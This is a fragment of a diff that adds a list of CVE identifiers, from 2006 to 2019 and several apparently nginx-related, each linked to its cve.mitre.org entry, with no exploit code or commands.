+        + CVE-2019-12208 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12208
+
+        + CVE-2019-12207 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12207
+
+        + CVE-2019-12206 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12206
+
+        + CVE-2019-11839 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11839
+
+        + CVE-2019-11838 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11838
+
+        + CVE-2019-11837 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11837
+
+        + CVE-2019-11246 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11246
+
+        + CVE-2018-8059 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8059
+
+        + CVE-2018-16845 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16845
+
+        + CVE-2018-16844 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16844
+
+        + CVE-2018-16843 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16843
+
+        + CVE-2018-1299 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1299
+
+        + CVE-2018-12029 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12029
+
+        + CVE-2018-11747 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11747
+
+        + CVE-2018-11046 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11046
+
+        + CVE-2018-1000653 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000653
+
+        + CVE-2017-8301 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8301
+
+        + CVE-2017-7529 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7529
+
+        + CVE-2016-4450 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4450
+
+        + CVE-2016-3190 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3190
+
+        + CVE-2016-1247 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1247
+
+        + CVE-2016-10345 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10345
+
+        + CVE-2016-0747 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0747
+
+        + CVE-2016-0746 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0746
+
+        + CVE-2016-0742 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0742
+
+        + CVE-2014-3616 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3616
+
+        + CVE-2014-3556 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3556
+
+        + CVE-2014-0133 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0133
+
+        + CVE-2014-0088 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0088
+
+        + CVE-2013-6798 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6798
+
+        + CVE-2013-4547 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4547
+
+        + CVE-2013-3694 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3694
+
+        + CVE-2013-2070 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2070
+
+        + CVE-2013-2028 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2028
+
+        + CVE-2013-0337 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0337
+
+        + CVE-2012-3380 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3380
+
+        + CVE-2012-2089 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2089
+
+        + CVE-2012-1180 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1180
+
+        + CVE-2011-4963 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4963
+
+        + CVE-2011-4770 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4770
+
+        + CVE-2011-4315 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4315
+
+        + CVE-2010-2266 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2266
+
+        + CVE-2010-2263 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2263
+
+        + CVE-2009-4611 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4611
+
+        + CVE-2009-4496 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4496
+
+        + CVE-2009-4495 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4495
+
+        + CVE-2009-4494 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4494
+
+        + CVE-2009-4493 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4493
+
+        + CVE-2009-4492 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4492
+
+        + CVE-2009-4491 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4491
+
+        + CVE-2009-4490 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4490
+
+        + CVE-2009-4489 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4489
+
+        + CVE-2009-4488 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4488
+
+        + CVE-2009-4487 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4487
+
+        + CVE-2009-3898 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3898
+
+        + CVE-2009-3896 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3896
+
+        + CVE-2009-3555 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3555
+
+        + CVE-2009-2629 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2629
+
+        + CVE-2006-4514 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4514
+
